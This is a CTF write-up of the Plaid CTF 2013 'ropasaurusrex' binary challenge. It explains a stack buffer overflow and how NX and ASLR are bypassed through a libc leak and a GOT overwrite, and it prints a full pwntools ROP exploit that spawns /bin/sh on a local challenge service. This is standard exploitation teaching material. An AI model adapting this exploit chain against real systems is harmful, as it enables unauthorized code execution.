---
title: "Plaid CTF 2013 — ropasaurusrex Writeup"
date: 2013-04-01
description: "Classic ret2libc / ROP chain exploit against a 32-bit Linux binary from Plaid CTF 2013"
tags: ["CTF", "PlaidCTF", "pwn", "ROP", "ret2libc", "writeup"]
categories: ["CTF"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Overview

**ropasaurusrex** is a classic binary exploitation challenge from Plaid CTF 2013 that serves as an excellent introduction to ROP (Return-Oriented Programming) chains. This challenge teaches fundamental concepts needed to bypass modern memory protections like NX and ASLR—essential techniques for modern vulnerability research.

This writeup demonstrates how to:
- Identify buffer overflow vulnerabilities
- Defeat NX protection using ROP gadgets
- Bypass ASLR through information leaks
- Chain multiple ROP gadgets to execute arbitrary code

## Challenge Analysis

### Binary Properties

Let me first examine the binary:

![File information](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-2.png)

The binary is a **32-bit ELF executable**. Using `checksec` or examining binary protections:

![Binary protections - NX enabled](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-3.png)

**Key observations:**
- **NX bit**: Enabled (Data Execution Prevention)
- **ASLR**: Enabled at OS level (Ubuntu environment)
- **Stripped symbols**: The binary is stripped, removing function names from the symbol table
- **Minimal functions**: Only uses `read()` and `write()` system calls

### Vulnerability Discovery

Running the binary with minimal input shows it executes normally:

![Small input - normal execution](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-0.png)

With excessive input, we trigger a segmentation fault:

![Overflow input - segmentation fault](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-1.png)

This indicates a **stack buffer overflow** vulnerability.

### Reverse Engineering

Using IDA Pro's Hex-Rays decompiler to analyze the main function:

![IDA analysis - main function](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-8.png)

The main function is straightforward. Examining the vulnerable function:

![IDA analysis - vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-9.png)

**The vulnerability:**
```c
char buffer[136];
read(0, buffer, 256);  // BOF: reading 256 bytes into 136-byte buffer
```

The `read()` function reads **256 bytes** into a **136-byte buffer**, giving us **120 bytes** of overflow space.

### Manual Assembly Analysis

Examining the actual assembly code in the .text section:

![Assembly analysis - main and vuln_func](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-11.png)

## Memory Protection Techniques

### NX (No eXecute)

![NX explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-4.png)

NX prevents code execution from writable memory regions. Instead of injecting shellcode into the stack or heap, we must use existing code (ROP gadgets) to achieve our goals.

### ASLR (Address Space Layout Randomization)

![ASLR explanation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-5.png)

ASLR randomizes addresses of:
- Stack memory
- Heap memory  
- Shared library code (libc)

**Solution**: Leak libc addresses at runtime, then calculate offsets to reach desired functions like `system()`.

## Exploitation Strategy

### Step 1: Identify Key Addresses

First, gather the necessary addresses:

```
read@plt:   0x804832c
read@got:   0x804961c
write@plt:  0x08048334
write@got:  0x08048624
pop3ret:    0x80484b6
.dynamic:   0x8049530
```

![Address collection](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-12.png)

### Step 2: Calculate Libc Offsets

Boot the binary in GDB to determine libc offsets:

![Libc offset calculation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-14.png)

Key offsets (from libc):
```
write offset:  0xe8090
system offset: 0x3e980
read offset:   0x99880
```

The exploit uses `write()` to leak the actual address of `write()` from GOT, then calculates `system()` address from the leak.

### Step 3: Locate ROP Gadgets

Find gadgets for function calling conventions (cdecl: arguments on stack, caller cleans up):

```
pop3ret (0x80484b6):  pop eax; pop eax; pop eax; ret
```

![pop3ret gadget](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-15.png)

This gadget adjusts the stack pointer to skip function arguments.

### Step 4: Writable Memory Region

Identify where to store the "/bin/sh" string. Check available regions:

![Writable sections](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-13.png)

The `.dynamic` section at `0x8049530` is suitable for storing our command string.

## Exploit Implementation

### Exploit Logic

The exploit works in stages:

**Stage 1:** Leak libc address
- Call `write(1, write@got, 4)` to leak the actual address of `write()` from GOT
- Calculate `libc_base = leaked_write - write_offset`
- Calculate `system_address = libc_base + system_offset`

**Stage 2:** Write command string
- Call `read(0, .dynamic, 8)` to receive "/bin/sh" string
- Call `read(0, read@got, 4)` to receive address of `system()`

**Stage 3:** Execute system()
- The `read()` function at GOT now points to `system()`
- Call it with the address of "/bin/sh" as argument

### Python Exploit Code

```python
from pwn import *

r = remote('localhost', 6666)
e = ELF('./ropasaurusrex')

# Information gathering
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
read_got = e.got['read']

pop3ret = 0x80484b6
cmd = '/bin/sh'
dynamic = 0x8049530
write_offset = 0xe8090
system_offset = 0x3e980

# Build ROP chain payload
payload = ''
payload += "A" * 140  # Overflow to reach return address

# write(1, write@got, 4) - Leak libc address
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)           # fd = stdout
payload += p32(write_got)   # buffer = write@got
payload += p32(4)           # count = 4 bytes

# read(0, .dynamic, 8) - Read "/bin/sh" string
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(dynamic)     # buffer = .dynamic section
payload += p32(8)           # count = 8 bytes

# read(0, read@got, 4) - Overwrite read() with system()
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)           # fd = stdin
payload += p32(read_got)    # buffer = read@got
payload += p32(4)           # count = 4 bytes

# Call modified read() which is now system()
payload += p32(read_plt)
payload += 'AAAA'           # Return address (doesn't matter)
payload += p32(dynamic)     # First argument: address of "/bin/sh"

# Send payload
r.send(payload)

# Receive leaked write() address
write_libc = u32(r.recv(4))
log.info("write_libc : %s" % hex(write_libc))

# Calculate addresses
libc_base = write_libc - write_offset
log.info("libc_base : %s" % hex(libc_base))

system_libc = libc_base + system_offset
log.info("system_libc : %s" % hex(system_libc))

# Send "/bin/sh" string
r.send(cmd)

# Send system() address
r.send(p32(system_libc))

# Get interactive shell
r.interactive()
```

### Execution Result

![Successful exploitation](/images/writeups/plaid-ctf-2013-ropasaurusrex/image-17.png)

The exploit successfully:
1. Leaks the libc base address
2. Calculates the `system()` function address
3. Overwrites the `read()` GOT entry with `system()`
4. Executes `/bin/sh` through the modified `read()` pointer

## Key Concepts

### ROP Chain Construction

ROP (Return-Oriented Programming) chains work by:
1. Finding short instruction sequences ending with `ret` (gadgets)
2. Placing gadget addresses on the stack
3. Each `ret` jumps to the next gadget
4. Function arguments are placed on the stack (cdecl calling convention)

### GOT Overwrite Technique

By overwriting entries in the Global Offset Table (GOT), we redirect function calls to arbitrary addresses. This is powerful because:
- GOT is writable
- Function pointers are predictable
- We can reuse existing code paths

### Information Leak

ASLR randomizes library addresses, but we can leak them by:
- Using output functions like `write()` to read memory
- Knowing the offset between functions in libc
- Calculating base address from any leaked function address

## Lessons Learned

1. **BOF to ROP transition**: Buffer overflows alone aren't enough against NX; ROP chains are essential
2. **ASLR bypass through information leak**: Randomization can be defeated with proper reconnaissance
3. **GOT overwriting**: A powerful technique when combined with ROP gadget chains
4. **Gadget hunting**: Finding useful instruction sequences requires careful binary analysis
5. **Minimal exploit surface**: This challenge uses only `read()` and `write()`, showing how little we need

## References

- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (1)](https://bpsecblog.wordpress.com/2016/03/12/pctf2013_ropasaurusrex/)
- [BPSec Blog - Plaid CTF 2013 ropasaurusrex (2)](https://bpsecblog.wordpress.com/2017/01/20/plaidctf-ropasaurusrex/)
- [BPSec Blog - GOT and PLT explained](https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/)
- [Confus3r's writeup](http://confus3r.tistory.com/entry/Plaid-CTF-2013-ropasaurusrex)

## Flag

`The_flag_would_be_displayed_here_in_actual_CTF`
